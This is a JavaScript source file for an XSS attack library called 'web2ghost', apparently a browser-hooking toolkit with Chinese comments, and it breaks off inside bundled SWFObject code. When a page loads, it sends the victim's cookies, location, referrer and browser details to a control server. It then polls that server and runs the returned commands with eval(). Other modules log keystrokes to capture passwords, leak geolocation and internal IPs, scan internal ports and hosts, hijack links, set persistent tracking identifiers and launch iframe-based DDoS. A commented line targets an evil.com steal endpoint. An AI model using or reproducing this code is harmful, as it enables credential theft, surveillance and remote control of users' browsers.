/*
web2ghost attack lib

TODO:
HTML5 function
*/


w2g_site = 'https://{IP}:{PORT}';

w2g = {
    version: '0.1',
    word: 'fly to the xss freedom'
};

/*
probed head
*/
probed = {};
probed.info = {}; // 隐私信息字典
probed.info.browser = function(){
	ua = navigator.userAgent.toLowerCase();
	var rwebkit = /(webkit)[ \/]([\w.]+)/;
	var ropera = /(opera)(?:.*version)?[ \/]([\w.]+)/;
	var rmsie = /(msie) ([\w.]+)/;
	var rmozilla = /(mozilla)(?:.*? rv:([\w.]+))?/;
	var match = rwebkit.exec( ua ) ||
		ropera.exec( ua ) ||
		rmsie.exec( ua ) ||
		ua.indexOf("compatible") < 0 && rmozilla.exec( ua ) ||
		[];
	return {name: match[1] || "", version: match[2] || "0"};
}();
probed.info.ua = escape(navigator.userAgent);
probed.info.lang = navigator.language;
probed.info.referrer = escape(document.referrer);
probed.info.location = escape(window.location.href);
probed.info.toplocation = escape(top.location.href);
probed.info.cookie = escape(document.cookie);
probed.info.domain = document.domain;
probed.info.title = document.title;
probed.info.screen = function(){
	var c = "";
	if (self.screen) {c = screen.width+"x"+screen.height;}
	return c;
}();
probed.info.flash = function(){
	var f="",n=navigator;
	if (n.plugins && n.plugins.length) {
		for (var ii=0;ii<n.plugins.length;ii++) {
			if (n.plugins[ii].name.indexOf('Shockwave Flash')!=-1) {
				f=n.plugins[ii].description.split('Shockwave Flash ')[1];
				break;
			}
		}
	}
	else
	if (window.ActiveXObject) {
		for (var ii=20;ii>=2;ii--) {
			try {
				var fl=eval("new ActiveXObject('ShockwaveFlash.ShockwaveFlash."+ii+"');");
				if (fl) {
					f=ii + '.0';
					break;
				}
			}
			 catch(e) {}
		}
	}
	return f;
}(); 

probed.info.cpucores = function() {
    var cores = '';
    try {
      if(typeof navigator.hardwareConcurrency != 'undefined') {
        cores = navigator.hardwareConcurrency;
      }
    } catch(e) {
      cores = '';
    }
    return cores;
}();

probed.info.memory = function() {
    var memory = '';
    try {
      if(typeof navigator.deviceMemory != 'undefined') {
        memory = navigator.deviceMemory;
      }
    } catch(e) {
      memory = '';
    }
    return memory;
}();

probed.info.localtime = function() {
	var local_time = new Date();
	return local_time.toLocaleString();
}();

probed.getisp = function(){
	//获取运营商信息
	var url = 'http://ip-api.com/json/';
	var Http = false;
	if(window.XMLHttpRequest) {
		Http = new XMLHttpRequest();
	} else if(window.ActiveXObject) {
		try {
			Http = new window.ActiveXObject('Microsoft.XMLHTTP');
		} catch(e) {}
	}
	
	Http.open("GET", url);
	Http.send();
	
	Http.onreadystatechange=function(){
		if(this.readyState == 4 && this.status == 200) {
			json_data = JSON.parse(Http.responseText);
			region_isp = json_data.isp;
			
			w2g.net.steal2db(region_isp,5);
		}
	
	}
};

probed.getLocation = function(){
	//获取定位信息，需要允许权限
    function showPosition(position)
    {	
		var position = "lng="+position.coords.longitude+"&lat="+position.coords.latitude;
		console.log(position);
	    w2g.net.steal2db(position,6);
    }
	
	if (navigator.geolocation)
	{
		navigator.geolocation.getCurrentPosition(showPosition, probed.getLocation);
	}

};

probed.json2str = function(o) {
	var arr = [];
	var fmt = function(s) {
		if (typeof s == 'object' && s != null) return probed.json2str(s);
		return /^(string|number)$/.test(typeof s) ? "'" + s + "'" : s;
	}
	for (var i in o) arr.push("'" + i + "':" + fmt(o[i]));
	return '{' + arr.join(',') + '}';
};

//加载页面初次调用的函数
window.onload = function(){
	var i = probed.json2str(probed.info);
	// new Image().src = http_server + i;
	var req = {
	  type: "GET", // GET
	  url: w2g_site + '/rtcmd?i=' + i,
	  async: true, // false
	  contentType: "application/x-www-form-urlencoded", // multipart/form-data; boundary=-------------------7964f8dddeb95fc5
	}
	w2g.ajax.req(req);
	w2g.hijack.keylog('document'); // 加载页面的时候就启动页面键盘监听器，以便记录账号密码
	probed.getisp();
	probed.getLocation();
  };

//间隔性发送心跳包接收命令
var interval = (interval == 'undefined')?interval:4000;
window.setInterval(function () {
	var i = probed.json2str(probed.info);
	var req = {
		type: "GET", // GET
		url: w2g_site + '/rtcmd?i=' + i,
		async: true, // false
		contentType: "application/x-www-form-urlencoded", // multipart/form-data; boundary=-------------------7964f8dddeb95fc5
	}
	w2g.ajax.req(req);	
  }, interval);

/*
probed end
*/

/////////////////////////////////////
// 字符串处理函数
/////////////////////////////////////
w2g.string = {
    nl2br: function (str) {
        return (str || "").replace(/([^>])\n/g, "$1<br />");
    },
    trim: function (str) {
        return (str || "").replace(/^\s+|\s+$/g, "");
    },
    ltrim: function (str) {
        return (str || "").replace(/^\s+/, "");
    },
    rtrim: function (str) {
        return (str || "").replace(/\s+$/, "");
    },
    strip: function (str) {
        return w2g.string.trim(str);
    },
    stripTags: function (str) {
        return str.replace(/<\/?[^>]+>/igm, "");
    },
    escapeHTML: function (str) {
        return str.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
    },
    unescapeHTML: function (str) {
        return str.replace(/&lt;/g, "<").replace(/&gt;/g, ">").replace(/&nbsp;/g, " ").replace(/&quot;/g, "\"").replace(/&amp;/g, "&");
    },
    include: function (str, key) {
        return str.indexOf(key) > -1;
    },
    startsWith: function (str, key) {
        return str.indexOf(key) === 0;
    },
    endsWith: function (str, key) {
        var d = str.length - key.length;
        return d >= 0 && str.lastIndexOf(key) === d;
    },
    isBlank: function (str) {
        return /^\s*$/.test(str);
    },
    isEmail: function (str) {
        return /^[A-Z_a-z0-9-\.]+@([A-Z_a-z0-9-]+\.)+[a-z0-9A-Z]{2,4}$/.test(str);
    },
    isMobile: function (str) {
        return /^((\(\d{2,3}\))|(\d{3}\-))?((1[345]\d{9})|(18\d{9}))$/.test(str);
    },
    isUrl: function (str) {
        return /^(http:|ftp:)\/\/[A-Za-z0-9]+\.[A-Za-z0-9]+[\/=\?%\-&_~`@[\]\':+!]*([^<>\"])*$/.test(str);
    },
    isIp: function (str) {
        return /^(0|[1-9]\d?|[0-1]\d{2}|2[0-4]\d|25[0-5]).(0|[1-9]\d?|[0-1]\d{2}|2[0-4]\d|25[0-5]).(0|[1-9]\d?|[0-1]\d{2}|2[0-4]\d|25[0-5]).(0|[1-9]\d?|[0-1]\d{2}|2[0-4]\d|25[0-5])$/.test(str);
    },
    isNumber: function (str) {
        return /^\d+$/.test(str);
    },
    isZip: function (str) {
        return /^[1-9]\d{5}$/.test(str);
    },
    isEN: function (str) {
        return /^[A-Za-z]+$/.test(str);
    },
    isJSON: function (str) {
        if (!isString(str) || str === "") {
            return false;
        }
        str = str.replace(/\\./g, "@").replace(/"[^"\\\n\r]*"/g, "");
        return (/^[,:{}\[\]0-9.\-+Eaeflnr-u \n\r\t]*$/).test(str);
    }
};

/////////////////////////////////////
// 基础模块
/////////////////////////////////////
w2g.base = {};

w2g.base.get_document = function(target) {
	var doc = null;
		
	if (target == undefined)
		doc = document;
	else if (target.contentDocument)
		doc  = target.contentDocument;
	else if (target.contentWindow)
		doc = target.contentWindow.document;
	else if (target.document)
		doc = target.document;
	
	return doc;
};

w2g.base.append2body = function(o){
	/*添加到DOM.body中*/
	document.getElementsByTagName("body")[0].appendChild(o);
};

w2g.base.remove_obj = function(o){
	/*移除标签对象*/
	document.body.removeChild(o);
};

w2g.base.$ = function(id){document.getElementById(id);};

w2g.base.addEvent = (function () {
  if (document.addEventListener) {
    return function (el, type, fn) {
      if (el && el.nodeName || el === window) {
        el.addEventListener(type, fn, false);
      } else if (el && el.length) {
        for (var i = 0; i < el.length; i++) {
          addEvent(el[i], type, fn);
        }
      }
    };
  } else {
    return function (el, type, fn) {
      if (el && el.nodeName || el === window) {
        el.attachEvent('on' + type, function () { return fn.call(el, window.event); });
      } else if (el && el.length) {
        for (var i = 0; i < el.length; i++) {
          addEvent(el[i], type, fn);
        }
      }
    };
  }
})();

w2g.base.createElem = function(elname, name, append){
	/*创建一个标签对象*/
	var el;
	if (typeof name != 'undefined' && document.getElementById(name))
		el = document.getElementById(name);
	else
		el = document.createElement(elname);
	el.style.visibility = 'hidden';
	el.style.position = 'absolute';
	if (name)
		el.setAttribute('id', name);
	if (append)
		document.body.appendChild(el);
	return el;
};

w2g.base.debug = function(data) {
	/*将信息输出到DOM中...*/
    var text;
    text = document.createElement('div');
    text.innerHTML = data + "<br>";
    document.body.appendChild(text);
};

/////////////////////////////////////
// AJAX模块
/////////////////////////////////////
w2g.ajax = {};

w2g.ajax.xhr = function(){
	var request = false;
	if(window.XMLHttpRequest) {
		request = new XMLHttpRequest();
	} else if(window.ActiveXObject) {
		try {
			request = new window.ActiveXObject('Microsoft.XMLHTTP');
		} catch(e) {}
	}
	return request;
}();

w2g.ajax.req = function(o){
	/*参数说明：
	{
		type: "POST", // GET
		url: "",
		async: true, // false
		contentType: "application/x-www-form-urlencoded", // multipart/form-data; boundary=-------------------7964f8dddeb95fc5
		data: {a:1, b:2},
		callback: function, // 函数引用
	}
	
	*/
	var xhr = w2g.ajax.xhr;
	xhr.open(o.type,o.url,o.async);
	xhr.onreadystatechange = function(){
		if(xhr.readyState == 4){
			// o.callback(xhr.responseText, o.getAllResponseHeaders());
      eval(xhr.responseText);
		}
	}
	if(o.type=="POST"){
		if(!o.contentType){o.contentType = 'application/x-www-form-urlencoded'}
		xhr.setRequestHeader("Content-Type",o.contentType);
	}
	xhr.send(o.data);
};


/////////////////////////////////////
// 注入模块
/////////////////////////////////////
w2g.inject = {};

w2g.inject.script = function(src,id){
	var o = document.createElement("script");
	o.src = src;
	if(id)o.id = id;
	document.getElementsByTagName("body")[0].appendChild(o);
	return o;
};

w2g.inject.script2obj = function(window_obj, src){
    s = window_obj.document.createElement('script');
    s.src = src;
    window_obj.document.getElementsByTagName('body')[0].appendChild(s)
};

w2g.inject.iframe = function(src,id){
	var o = document.createElement("iframe");
	o.src = src;
	o.width = 0;
	o.height = 0;
	o.margin = 0;
	o.frameBorder = none;
	if(id)o.id = o.name = id;
	document.getElementsByTagName("body")[0].appendChild(o);
	return o;
};

w2g.inject.flash = function(o){
	/*参数说明：
	{
		src: "",
		width: 0,
		height: 0,
		allowNetworking: "all", // internal, none
		allowScriptAccess: "always", // never, sameDomain
	}
	*/
	var p = document.createElement("div");
	p.innerHTML = "<embed src=\""+o.src+"\" type=\"application/x-shockwave-flash\" "+"width=\""+(o.width||"0")+"\" height=\""+(o.height||"0")+"\" allowFullScreen=\"true\" wmode=\""+(o.wmode||"transparent")+"\" allowNetworking=\""+(o.allowNetworking||"all")+"\" allowScriptAccess=\""+(o.allowScriptAccess||"always")+"\"></embed>";
	document.getElementsByTagName("body")[0].appendChild(p);
}; 


/////////////////////////////////////
// 劫持模块
/////////////////////////////////////
w2g.hijack = {};

w2g.hijack.links = function (js){
	/*劫持链接点击，参数说明：
	js: 注入打开的同域链接页面的目标js文件
	
	DEMO: w2g.hijack.links("http://w2g:8888/payloads/lib/browserjack.js");
	*/
    for (i = 0; i < document.links.length; i++) {
        document.links[i].onclick = function () {
            x = window.open(this.href);
            //for (var i = 0; js = hijack_injs[i]; i++) {
			setTimeout("w2g.inject.script2obj(x,'"+js+"')", 2000);
            //}
            return false
        };
    }
};

w2g.hijack.keylog= function(obj){
	try{obj = eval(obj);}catch(e){}
	if(typeof(obj)!="object"){
		try{
			obj = document.getElementById(obj);
		}catch(e){obj=document;}
		if(!obj) obj=document;
	}

	//alert(obj.value);
	var keystring = "";//记录按键的字符串

	function keypress(e){
		var currKey=0,CapsLock=0,e=e||event;
		currKey=e.keyCode||e.which||e.charCode;
		CapsLock=currKey>=65&&currKey<=90;
		switch(currKey){
			case 8: case 9:case 13:case 32:case 38:case 39:case 46:keyName = "";break;
			default:keyName = String.fromCharCode(currKey); break;
		}
		keystring += keyName;
	}

	function keydown(e){
		var e=e||event;
		var currKey=e.keyCode||e.which||e.charCode;
		if((currKey>7&&currKey<14)||(currKey>31&&currKey<47))
		{
			switch(currKey){
				case 8: keyName = "[LF]"; break;
				case 9: keyName = "[TAB]"; break;
				case 13:keyName = "[CR]"; break;
				case 32:keyName = "[SPACE]"; break;
				case 33:keyName = "[PageUp]"; break;
				case 34:keyName = "[PageDown]"; break;
				case 35:keyName = "[End]"; break;
				case 36:keyName = "[Home]"; break;
				case 37:keyName = "[LEFT]"; break;
				case 38:keyName = "[UP]"; break;
				case 39:keyName = "[RIGHT]"; break;
				case 40:keyName = "[DOWN]"; break;
				case 46:keyName = "[DEL]"; break;
				default:keyName = ""; break;
			}
			if (keyName=='[CR]'){
				//alert(keystring);
				//if(keystring) w2g.net.get("http://www.evil.com:8080/xss/steal.php?data="+keystring);
				if(keystring) w2g.net.steal2db(keystring,1);
				keystring = "";
			}else{
				keystring += keyName;
			}
		}
	}
	function keyup(e){
		return keystring;
	}

	function blur(){
		//alert(keystring);
		if(keystring) w2g.net.steal2db(keystring,1);
		keystring = "";
	}

	function beforeunload(){
		if(keystring) w2g.net.steal2db(keystring,1);
		keystring = "";
	}

	function bindEvent(o, e, fn){
		//o 绑定的标签对象
		//e 绑定的事件
		//fn 绑定后执行的函数
		if (typeof o == "undefined" || typeof e == "undefined" || typeof fn == "undefined" || o == null){
			return false;
		}
		if (o.addEventListener){
			o.addEventListener(e, fn, false);
		} 
		else if (o.attachEvent){  // IE
			o.attachEvent("on"+e, fn);
		}
		else {
			var oldhandler = o["on"+e];
			if (oldhandler) {
				o["on"+e] = function(x){ 
					oldhandler(x);
					fn();
				}
			}
			else {
				o["on"+e] = function(x){ 
					fn();
				}
			}
		}
		try{o.focus();}catch(e){}
	}

	bindEvent(obj,'keypress',keypress);
	bindEvent(obj,'keydown',keydown);
	bindEvent(obj,'keyup',keyup);
	if(obj==document) obj=window; // window失去焦点，document无
	bindEvent(obj,'blur',blur);
	bindEvent(window,'beforeunload',beforeunload); // 关闭窗口

	//alert('keylogger here!');
};

/////////////////////////////////////
// 请求模块
/////////////////////////////////////
w2g.net = {};

w2g.net.get = function(src){
	new Image().src = src;
};

w2g.net.post = function(o){
	/*参数说明：
	{
		url: "",
		data: {a:1, b:2},
		target: "xxx", // 比如某iframe的name值
	}
	*/
	function create_elements(eForm, eName, eValue){
		var e = document.createElement("input");
		eForm.appendChild(e);
		e.type = 'text';
		e.name = eName;
		if(!document.all){e.style.display = 'none';}else{
			e.style.display = 'block';
			e.style.width = '0px';
			e.style.height = '0px';
		}
		e.value = eValue;
		return e;
	}
	
	if(o.target){
		if(!w2g.base.$(o.target)){
			w2g.inject.iframe("#",o.target);
		}
	}
	var f = document.createElement("form");
	f.action = o.url;
	f.method = "post";
	f.target = o.target;
	for(var k in o.data){
		create_elements(f,k,o.data[k]);
	}
	
	document.getElementsByTagName("body")[0].appendChild(f);
	f.submit();
};

w2g.net.postjson = function(o){
	/*参数说明：
	{
		url: "",
		data: {a:1, b:2},
		target: "xxx", // 比如某iframe的name值
	}
	*/

	if(window.XMLHttpRequest) {
		Http = new XMLHttpRequest();
	} else if(window.ActiveXObject) {
		try {
			Http = new window.ActiveXObject('Microsoft.XMLHTTP');
		} catch(e) {}
	}
	Http.open("post",o.url);
	Http.send(JSON.stringify(o.data));

};

w2g.net.portscan = function(host,port,timeout){
	/*端口扫描，一次扫描一个端口效果还可以，如果for循环批量扫描效果会变得非常差*/
	var m = new Image();
	m.onerror = function(){
		if (!m) return;
		m = undefined;
		var info = host+":"+port+" open";
		w2g.net.steal2db(info,2);
	};
	m.onload = m.onerror;
	m.src='http://'+host+':'+port;

	setTimeout(function () {
		if (!m) return;
		m = undefined;
		var info = host+":"+port+" close";
		w2g.net.steal2db(info,2);
	}, 900);
};

w2g.net.pingscan = function(host_range,timeout){
	/*扫描指定主机段的存活状态，如：192.168.10.100-254*/
	var host = host_range.split('-')[0];
	var end = host_range.split('-')[1];
	if(!end){
		var url = 'http://'+host;
		_pingscan(url,timeout);
		return;
	}else{
		var hostArray = new Array();
		var host_blocks = host.split('.');
		host_blocks.pop(-1);
		var host_ = host_blocks.join('.');
		var start = host.split('.')[3];
		if(!start)return;
		for(i=start;i<=end;i++){
			var whole_host = host_ + '.' + i;
			hostArray.push(whole_host);
		}
		for(i in hostArray){
			var url = 'http://'+hostArray[i];
			_pingscan(url,timeout);
		}
	}
};

function _pingscan(url, timeout) {
	/*
	from: http://ha.ckers.org/weird/xhr-ping-sweep.html
	http://securethoughts.com/security/ie8xdr/ie8xdr-ping-sweep.html
	*/
    var d = new Date;
    if (window.XDomainRequest) {
        var req = new XDomainRequest();
        req.onerror = fndprocessRequest;
        req.ontimeout = errprocessRequest;
        req.timeout = timeout;

        function errprocessRequest() {
            var d2 = new Date;
            var time = d2.getTime() - d.getTime();
            //w2g.base.debug("Doesn't exist: " + url + " at " + time + "ms.");
			var info = url.substring(7) + " down, " + time + "ms.";
            //w2g.net.steal2db(info, 3);
        }

        function fndprocessRequest() {
            var d2 = new Date;
            var time = d2.getTime() - d.getTime();
            //w2g.base.debug("Exists: " + url + " at " + time + "ms.");
			var info = url.substring(7) + " live, " + time + "ms.";
            w2g.net.steal2db(info, 3);
        }
    } else if (window.XMLHttpRequest) {
        var req = new XMLHttpRequest();
        // req.withCredentials = "true"; //creates a popup
        function processRequest() {
            if (req.readyState == 4) {
                var d2 = new Date;
                var time = d2.getTime() - d.getTime();
                // Time will be more variable once you start scanning more than a 
                // few hosts... so this would need to be re-written.
                if (time < timeout) {
                    if (time > 10) {
                        //w2g.base.debug("Exists: " + url + " at " + time + "ms.");
						var info = url.substring(7) + " live, " + time + "ms.";
						w2g.net.steal2db(info, 3);
                    }
                } else {
                    //w2g.base.debug("Doesn't exist: " + url + " at " + time + "ms.");
					var info = url.substring(7) + " down, " + time + "ms.";
					//w2g.net.steal2db(info, 3);
                }
            }
        }
        req.onreadystatechange = processRequest;
        /*
        function processRequest() {
            if (req.readyState == 4) {
                var d2 = new Date;
                var time = d2.getTime() - d.getTime();
                // Time will be more variable once you start scanning more than a 
                // few hosts... so this would need to be re-written.
                if (time < timeout) {
                    if (time > 10) {
                        //w2g.base.debug("Exists: " + url + " at " + time + "ms.");
						var info = url.substring(7) + " live, " + time + "ms.";
						w2g.net.steal2db(info, 3);
                    }
                } else {
                    //w2g.base.debug("Doesn't exist: " + url + " at " + time + "ms.");
					var info = url.substring(7) + " down, " + time + "ms.";
					//w2g.net.steal2db(info, 3);
                }
            }
        }
        */
    } else return;

    req.open("get", url);
    req.send();
}


w2g.net.inner_ip = getIPs;

w2g.net.steal2db = function(_info,type){
	/*偷窃信息记录进数据库中*/
	if(!_info) return;
	if(typeof(info) != 'undefined' && info.id){
		var id = info.id;
		w2g.net.get(w2g_site+"/steal?info="+_info+"&id="+id+"&domain="+document.domain+"&type="+type+'&date='+new Date().getTime());
	}else{
		var id = w2g.watermark.get(w2g.watermark.name);
		w2g.net.get(w2g_site+"/steal?info="+_info+"&id="+id+"&domain="+document.domain+"&type="+type+'&date='+new Date().getTime());
	}
};

//get the IP addresses associated with an account
function getIPs(){

	function get_innerIP_by_webRTC(callback){
		var RTCPeerConnection =window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
	
		if (RTCPeerConnection) (function () {
			var rtc = new RTCPeerConnection({iceServers:[]});
			if (1 || window.mozRTCPeerConnection) {
				rtc.createDataChannel('', {reliable:false});
			};
			rtc.onicecandidate = function (evt) {
				if (evt.candidate) grepSDP("a="+evt.candidate.candidate);
			};
			rtc.createOffer(function (offerDesc) {
				grepSDP(offerDesc.sdp);
				rtc.setLocalDescription(offerDesc);
			}, function (e) { console.warn("offer failed", e); });
		
		
			var addrs = Object.create(null);
			addrs["0.0.0.0"] = false;
			function updateDisplay(newAddr) {
				if (newAddr in addrs) return;
				else addrs[newAddr] = true;
				var inner_ip = Object.keys(addrs).filter(function (k) { return addrs[k]; });
				callback(inner_ip);
			}
			function grepSDP(sdp) {
				var hosts = [];
				sdp.split('\r\n').forEach(function (line) {
					if (~line.indexOf("a=candidate")) {
						var parts = line.split(' '),        
							addr = parts[4],
							type = parts[7];
						if (type === 'host') updateDisplay(addr);
					} else if (~line.indexOf("c=")) {
						var parts = line.split(' '),
							addr = parts[2];
						updateDisplay(addr);
					}
				});
			}
		})();
	};

	function get_innerIP_by_AXObject(callback){

		var wsnetwork = new ActiveXObject ( "WScript.NetWork" );
		var username = wsnetwork.UserName;
		
		var locator = new ActiveXObject ("WbemScripting.SWbemLocator");
		var service = locator.ConnectServer("."); 
		var properties = service.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration where IPEnabled=TRUE");

		var e = new Enumerator (properties);
		var msg="";
		for (;!e.atEnd();e.moveNext ())
		{
			var p = e.item ();
			msg+="IP: " + p.IPAddress(0) + "; ";
			msg+="gateway: "+p.DefaultIPGateway(0)+ "; ";
			msg+="hostname: "+p.DNSHostName + "; ";
		}
		msg+="username: "+username+"; ";
		callback(msg);
	};

	if(navigator.userAgent.indexOf('trident') > 0){
		get_innerIP_by_AXObject(function(ip){
			console.log(ip);
			w2g.net.steal2db(ip,4);
		})
	} else{
		get_innerIP_by_webRTC(function(ip){
			console.log(ip);
			w2g.net.steal2db(ip,4);
		})
	}
}


/////////////////////////////////////
// Cookie操作模块
/////////////////////////////////////
w2g.cookie = {};

w2g.cookie.set = function(name, value, expires, path, domain, secure){
	/*添加cookie，参数说明：
	expires: 'Wed, 24 Aug 2012 08:50:46 GMT'
	path: 可以设置子目录
	domain: 可以设置本域及父域
	secure: 随便指定一个值就是secure，这样的cookie将在SSL层传输
	*/
	document.cookie = name + "=" + escape(value) +
	((expires) ? "; expires=" + expires : "") +
	((path) ? "; path=" + path : "") +
	((domain) ? "; domain=" + domain : "") +
	((secure) ? "; secure" : "");
};



w2g.cookie.get = function(name){
	/*获取指定name的cookie值*/
    var i, x, y, cookie_array = document.cookie.split(";");
    for (i = 0; i < cookie_array.length; i++) {
        x = cookie_array[i].substr(0, cookie_array[i].indexOf("="));
        y = cookie_array[i].substr(cookie_array[i].indexOf("=") + 1);
        x = x.replace(/^\s+|\s+$/g, "");
        if (x == name) {
            return unescape(y);
        }
    }
};

/*w2g.cookie.get = function(name){
    var search = name + "="
    var value = "";
    if (document.cookie.length > 0) {
        offset = document.cookie.indexOf(search)
        if (offset != -1) {
            offset += search.length
            end = document.cookie.indexOf(";", offset);
            if (end == -1) end = document.cookie.length;
            value = unescape(document.cookie.substring(offset, end))
        }
    }
    return value;
}*/

w2g.cookie.del = function(name,path,domain){
	/*删除指定name的cookie值*/
    var exp = new Date();
    exp.setTime(exp.getTime() - 3700000*1000);
	document.cookie = name + "=" + ((path) ? "; path=" + path : "") + ((domain) ? "; domain=" + domain : "") + "; expires="+exp.toGMTString();
};

w2g.cookie.get_expires = function(seconds){
	var exdate=new Date();
	exdate.setTime(exdate.getTime() - seconds*1000);
	return exdate.toUTCString();
};

/////////////////////////////////////
// 水印操作模块
// from samy's evercookie
/////////////////////////////////////
w2g.watermark = {
	'name': '__utmwg', // 水印名
	'value': ''
};

w2g.watermark.inj_w2gcookie_swf = function() {
	var o = w2g.base.createElem('div','w2g_swf_div',1);
	if (window.ActiveXObject) { // 兼容maxthon3 ie模式，神奇的差异……
		var x = '<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" id="w2gswf" width="500" height="10">';
	}else{
		var x = '<object type="application/x-shockwave-flash" data="'+w2g_site+'/payloads/lib/w2gcookie.swf" width="500" height="10" id="w2gswf">';
	}
	x = x +
		'<param name="bgcolor" value="#333333" />' +
		'<param name="movie" value="'+w2g_site+'/payloads/lib/w2gcookie.swf" />' +
		'<param name="allowScriptAccess" value="always" /> ' +
	    '</object>';
	o.innerHTML = x;
	//alert(o.innerHTML); // 差异看这
};

w2g.watermark.cookie = {};
w2g.watermark.cookie.set = function(name, value, expires, path, domain, secure){
	/*添加cookie，参数说明：
	expires: 'Wed, 24 Aug 2012 08:50:46 GMT'
	path: 可以设置子目录
	domain: 可以设置本域及父域
	secure: 随便指定一个值就是secure，这样的cookie将在SSL层传输
	*/
	document.cookie = name + "=" + escape(value) +
	((expires) ? "; expires=" + expires : "") +
	((path) ? "; path=" + path : "") +
	((domain) ? "; domain=" + domain : "") +
	((secure) ? "; secure" : "");
};

w2g.watermark.cookie.get = function(name){
	/*获取指定name的cookie值*/
    var i, x, y, cookie_array = document.cookie.split(";");
    for (i = 0; i < cookie_array.length; i++) {
        x = cookie_array[i].substr(0, cookie_array[i].indexOf("="));
        y = cookie_array[i].substr(cookie_array[i].indexOf("=") + 1);
        x = x.replace(/^\s+|\s+$/g, "");
        if (x == name) {
            return unescape(y);
        }
    }
};

w2g.watermark.set = function(name,value){
	/*设置水印*/
	w2g.watermark.value = value; // 设置全局水印值
	w2g.watermark.cookie.set(name,value,'Wed, 24 Aug 2212 08:50:46 GMT');
	w2g.watermark.flash(name,value);
	w2g.watermark.local_storage(name,value);
	w2g.watermark.userdata(name,value);
};

w2g.watermark.get = function(name){
	/*读取水印*/
	if(w2g.watermark.value){ // 如果全局里有水印值就直接返回
		return w2g.watermark.value;
	}
	if(typeof(watermark)!='undefined'&&watermark.value){ // 如果全局里有水印值就直接返回
		return watermark.value;
	}
	var value;
	value = w2g.watermark.flash(name);
	if(value){
		w2g.watermark.set(name, value);
		return value;
	}else{
		value = w2g.watermark.local_storage(name)||w2g.watermark.userdata(name)||w2g.watermark.cookie.get(name);
		if(value){
			w2g.watermark.set(name, value);
			return value;
		}else{
			value = w2g.watermark.unique_value();
			w2g.watermark.set(name, value);
			return value;
		}
	}
};

w2g.watermark.userdata = function(name,value){
	/*IE下的userData储存*/
	try {
		var elm = w2g.base.createElem('div', 'userdata_el', 1);
		elm.style.behavior = "url(#default#userData)";
		if (typeof(value) != "undefined"){
			elm.setAttribute(name, value);
			elm.save(name);
		}
		else{
			elm.load(name);
			return elm.getAttribute(name);
		}
	} catch(e) { }
};

w2g.watermark.flash = function(name,value){
	/*flash的lso储存，跨浏览器的*/
	try{
		if (typeof(value) != "undefined"){
			w2g.base.$('w2gswf').set_watermark(name,value);
		}else{
			return w2g.base.$('w2gswf').get_watermark(name);
		}
	} catch (e) { }
};

w2g.watermark.local_storage = function(name,value){
	/*HTML5里的本地储存，新浏览器一般都支持*/
	try{
		if (window.localStorage){
			if (typeof(value) != "undefined")
				localStorage.setItem(name, value);
			else
				return localStorage.getItem(name);
		}
	} catch (e) { }
};

w2g.watermark.unique_value = function(){
	var now = new Date().getTime();
	var unique_value = Math.random()*(999999999999999-now+1)+now;
	return unique_value.toString();
};


/////////////////////////////////////
// 其它攻击模块
/////////////////////////////////////
w2g.misc = {};

w2g.misc.ddos = function(url,interval){
	/*DDOS功能，基于多用户（比如被XSS蠕虫感染的用户），参数说明：
	url: DDOS的目标url
	interval: 间隔时间，单位毫秒，默认2000
	*/
	setInterval(function(){w2g.inject.iframe(url);}, interval?interval:2000);
};



/*	SWFObject v2.2 <http://code.google.com/p/swfobject/> 
	is released under the MIT License <http://www.opensource.org/licenses/mit-license.php> 
*/
var swfobject=function(){var D="undefined",r="object",S="Shockwave Flash",W="ShockwaveFlash.ShockwaveFlash",q="application/x-shockwave-flash",R="SWFObjectExprInst",x="onreadystatechange",O=window,j=document,t=navigator,T=false,U=[h],o=[],N=[],I=[],l,Q,E,B,J=false,a=false,n,G,m=true,M=function(){var aa=typeof j.getElementById!=D&&typeof j.getElementsByTagName!=D&&typeof j.createElement!=D,ah=t.userAgent.toLowerCase(),Y=t.platform.toLowerCase(),ae=Y?/win/.test(Y):/win/.test(ah),ac=Y?/mac/.test(Y):/mac/.test(ah),af=/webkit/.test(ah)?parseFloat(ah.replace(/^.*webkit\/(\d+(\.\d+)?).*$/,"$1")):false,X=!+"\v1",ag=[0,0,0],ab=null;if(typeof t.plugins!=D&&typeof t.plugins[S]==r){ab=t.plugins[S].description;if(ab&&!(typeof t.mimeTypes!=D&&t.mimeTypes[q]&&!t.mimeTypes[q].enabledPlugin)){T=true;X=false;ab=ab.replace(/^.*\s+(\S+\s+\S+$)/,"$1");ag[0]=parseInt(ab.replace(/^(.*)\..*$/,"$1"),10);ag[1]=parseInt(ab.replace(/^.*\.(.*)\s.*$/,"$1"),10);ag[2]=/[a-zA-Z]/.test(ab)?parseInt(ab.replace(/^.*[a-zA-Z]+(.*)$/,"$1"),10):0}}else{if(typeof O.ActiveXObject!=D){try{var ad=new ActiveXObject(W);if(ad){ab=ad.GetVariable("$version");if(ab){X=true;ab=ab.split(" ")[1].split(",");ag=[parseInt(ab[0],10),parseInt(ab[1],10),parseInt(ab[2],10)]}}}catch(Z){}}}return{w3:aa,pv:ag,wk:af,ie:X,win:ae,mac:ac}}(),k=function(){if(!M.w3){return}if((typeof j.readyState!=D&&j.readyState=="complete")||(typeof j.readyState==D&&(j.getElementsByTagName("body")[0]||j.body))){f()}if(!J){if(typeof j.addEventListener!=D){j.addEventListener("DOMContentLoaded",f,false)}if(M.ie&&M.win){j.attachEvent(x,function(){if(j.readyState=="complete"){j.detachEvent(x,arguments.callee);f()}});if(O==top){(function(){if(J){return}try{j.documentElement.doScroll("left")}catch(X){setTimeout(arguments.callee,0);return}f()})()}}if(M.wk){(function(){if(J){return}if(!/loaded|complete/.test(j.readyState)){setTimeout(arguments.callee,0);return}f()})()}s(f)}}();function f(){if(J){return}try{var Z=j.getElementsByTagName("body")[0].appendChild(C("span"));Z.parentNode.removeChild(Z)}catch(aa){return}J=true;var X=U.length;for(var Y=0;Y<X;Y++){U[Y]()}}function K(X){if(J){X()}else{U[U.length]=X}}function s(Y){if(typeof O.addEventListener!=D){O.addEventListener("load",Y,false)}else{if(typeof j.addEventListener!=D){j.addEventListener("load",Y,false)}else{if(typeof O.attachEvent!=D){i(O,"onload",Y)}else{if(typeof O.onload=="function"){var X=O.onload;O.onload=function(){X();Y()}}else{O.onload=Y}}}}}function h(){if(T){V()}else{H()}}function V(){var X=j.getElementsByTagName("body")[0];var 